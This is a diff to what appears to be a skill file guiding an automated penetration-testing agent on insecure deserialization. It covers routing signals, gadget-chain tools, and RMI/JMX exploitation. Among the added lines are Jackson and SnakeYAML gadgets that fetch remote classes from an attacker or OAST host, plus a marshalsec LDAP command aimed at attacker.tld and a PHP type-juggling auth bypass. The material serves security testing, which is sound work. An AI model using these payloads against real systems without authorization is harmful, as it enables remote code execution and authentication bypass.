@@ -1,7 +1,35 @@
 ---
 name: deserialization
 description: >-
-  Use deserialization when recon shows an application trusting opaque bytes that it must reconstruct back into program objects, most often a long Base64 or URL-encoded blob carried in a cookie, token, header, or hidden form field that round-trips unchanged between requests — classic tells include a session or identity cookie that Base64-decodes to a serialized-looking prefix, an Apache Shiro rememberMe or Spring Security remember-me cookie, ASP.NET __VIEWSTATE / __VIEWSTATEGENERATOR / __EVENTVALIDATION fields, a Laravel session cookie, a Content-Type of application/x-java-serialized-object or application/x-amf, or a JSON API that accepts polymorphic type hints such as a $type or @class key. Also dispatch when recon surfaces sinks that touch user-controlled bytes or paths: import/export, "restore from backup", RPC, message-queue, JMX/RMI/T3/IIOP endpoints, file uploads of .ser/.phar/.pickle/.bin/.dat or YAML, or a PHP path parameter feeding a filesystem function (PHAR), and when the runtime fingerprint is Java, .NET, PHP, Python, Node, or Ruby with a serializer library in play. Disambiguate from look-alikes: input reaching eval, a shell command, or a process spawn directly is RCE, not this; a value rendered through a template engine is SSTI; a serialized-looking value merely echoed back unparsed is reflection or XSS; and a simple unsigned identity field like userid=5 or a plain JWT is IDOR or auth-bypass — route here only when the tampered identity lives inside a serialized object graph. Do NOT base dispatch on having already flipped a byte, truncated the blob, or seen a deserializer stack trace — those confirmations belong to the running skill, not the routing decision. Covers magic-byte format fingerprinting, gadget-chain selection via ysoserial / ysoserial.net / phpggc / marshalsec, blind detection (timing / DNS-HTTP OAST), and chaining confirmed sinks to RCE, file write, SSRF, or auth bypass.
+  Use: Use deserialization when recon shows an application trusting opaque bytes that it must
+  reconstruct back into program objects, most often a long Base64 or URL-encoded blob carried in a
+  cookie, token, header, or hidden form field that round-trips unchanged between requests — classic
+  tells include a session or identity cookie that Base64-decodes to a serialized-looking prefix, an
+  Apache Shiro rememberMe or Spring Security remember-me cookie, ASP.NET __VIEWSTATE /
+  __VIEWSTATEGENERATOR / __EVENTVALIDATION fields, a Laravel session cookie that appears
+  decryptable/unsigned, exposes serialized bytes, or appears alongside key leakage, a Content-Type
+  of application/x-java-serialized-object or application/x-amf, a deserializer stack trace or
+  serializer class name observed during recon, or a JSON API that accepts polymorphic type hints
+  such as a $type or @class key.
+  Signals: Also dispatch when recon surfaces sinks that touch user-controlled bytes or paths:
+  import/export, "restore from backup", RPC, message-queue, JMX/RMI/T3/IIOP endpoints, file uploads
+  of .ser/.phar/.pickle/.bin/.dat or YAML, or a PHP path parameter feeding a filesystem function
+  (PHAR), and when the runtime fingerprint is Java, .NET, PHP, Python, Node, or Ruby with a
+  serializer library in play.
+  Pair with: Also dispatch insecure-file-uploads, ssrf, rce, auth-testing in parallel when the same
+  evidence shows those mechanisms too; co-dispatch means separate focused workers sharing the same
+  investigation state, not merging skill prompts.
+  Coverage: Covers magic-byte format fingerprinting, gadget-chain selection via ysoserial /
+  ysoserial.net / phpggc / marshalsec, blind detection (timing / DNS-HTTP OAST), and chaining
+  confirmed sinks to RCE, file write, SSRF, or auth bypass.
+  Do not use: Disambiguate from look-alikes: input reaching eval, a shell command, or a process
+  spawn directly is RCE, not this; a value rendered through a template engine is SSTI; a
+  serialized-looking value merely echoed back unparsed is reflection or XSS; and a simple unsigned
+  identity field like userid=5 or a plain JWT is IDOR or auth-bypass — route here only when the
+  tampered identity lives inside a serialized object graph. Do NOT base dispatch only on having
+  already flipped a byte or truncated the blob — those confirmations belong to the running skill,
+  not the routing decision. A deserializer stack trace observed naturally during recon is a valid
+  dispatch signal.
 metadata:
   dispatchable: true
 ---
@@ -51,9 +79,15 @@ must touch is a candidate. Don't only look at HTTP bodies.
 
 ### Java
 - `ObjectInputStream.readObject()` over HTTP, RMI, JMX, T3 (WebLogic),
-  IIOP, JNDI, custom protocols.
+  IIOP, JNDI, custom protocols. **An exposed RMI registry or `jmxrmi`
+  endpoint is a network-level deserialization sink** — fingerprint with
+  `nmap --script rmi-dumpregistry,rmi-vuln-classloader`, then enumerate
+  and exploit with `rmg` / `beanshooter`; see `references/java-rmi-jmx.md`.
 - **Jackson** with `enableDefaultTyping()` or `@JsonTypeInfo` on
-  polymorphic types from untrusted JSON.
+  polymorphic types from untrusted JSON. Fingerprint by sending malformed
+  JSON and reading the error for `com.fasterxml.jackson.databind` /
+  `As.WRAPPER_ARRAY`; then send a `["<class>", {...}]` gadget. Copy-paste
+  named-CVE gadgets in `references/payloads-java-dotnet.md`.
 - **XStream** without a security framework (dynamic proxies,
   `EventHandler`).
 - **Kryo** with `setRegistrationRequired(false)`.
@@ -88,6 +122,11 @@ must touch is a candidate. Don't only look at HTTP bodies.
   `file_get_contents`, `fopen`, `is_dir`, `unlink`, `getimagesize`,
   `imagecreatefrompng`) on a `phar://` URL triggers metadata
   deserialization. Works even with no visible `unserialize()` call.
+- Treat a PHP route, worker, or internal service that applies filesystem
+  functions to a user-influenced path/filename as a deserialization sink
+  candidate even when source/recon never shows `unserialize()`. Pair the
+  path sink with any upload/import/cache location you can control, then
+  test whether the same path can be addressed through `phar://`.
 - **Laravel** `decrypt()` over tampered `X-XSRF-TOKEN` /
   `laravel_session` cookie when `APP_KEY` leaks.
 
@@ -184,6 +223,15 @@ reference. For **Apache Shiro**, the `rememberMe` cookie is AES-CBC
 encrypted with the rememberMe key — encrypt a ysoserial blob with
 the key, base64, send as the cookie.
 
+For **Jackson / JSON-databind** sinks you often skip the LDAP server
+entirely: a `["org.springframework...FileSystemXmlApplicationContext",
+"http://oast/spel.xml"]` or an H2-JDBC `RUNSCRIPT` gadget pulls a
+remote resource by itself. For **SnakeYAML**, the one-liner
+`!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader ... ]`
+fetches a class from your host — JDK-only, no marshalsec build.
+For **JSF / MyFaces ViewState**, documented default secrets can mint a
+MAC-valid blob. All in `references/payloads-java-dotnet.md`.
+
 ### .NET — ysoserial.net chains by reliability
 1. `TypeConfuseDelegate` — most reliable, multiple formatters.
 2. `ActivitySurrogateSelector(FromFile)` — bypasses .NET 4.8+
@@ -214,6 +262,12 @@ JPG, trigger via any file-system function on `phar://path/shell.phar`.
 Magic methods to watch in custom code: `__wakeup`, `__destruct`,
 `__toString`, `__call`, `__get`, `__set`. Autoloaded classes become
 candidate gadgets.
+
+**No gadget chain needed for auth bypass.** If the app `unserialize()`s
+a cookie/field then loose-compares (`==`) it for auth, win with
+type-juggling (`b:1` true beats any stored secret) or a `N` + `R:n`
+reference so two compared fields share one value. Recipes in
+`references/payloads-php-python.md`.
 
 ### Python
 `pickle` arbitrary-code via `__reduce__` — a class whose
@@ -265,6 +319,12 @@ when the decoded type has registered methods invoked reflectively.
   marshalsec.jar marshalsec.jndi.LDAPRefServer
   http://attacker.tld/#Exploit 1389`. Pair with a class-hosting HTTP
   server.
+- **nmap** (installed): RMI/JMX detection — `nmap -sV -Pn -p <port>
+  --script rmi-dumpregistry,rmi-vuln-classloader <ip>`. Bound names
+  and a VULNERABLE classloader confirm a network deserialization sink.
+- **rmg / beanshooter** (Java RMI/JMX): enumerate bound names and
+  exploit JMX (MLet RCE, gadget-at-endpoint). Flow in
+  `references/java-rmi-jmx.md`.
 - **Python pickle / PyYAML**: hand-rolled — see examples above.
 
 For OAST and timing oracles use `curl`, `dig`, `nslookup`, and a
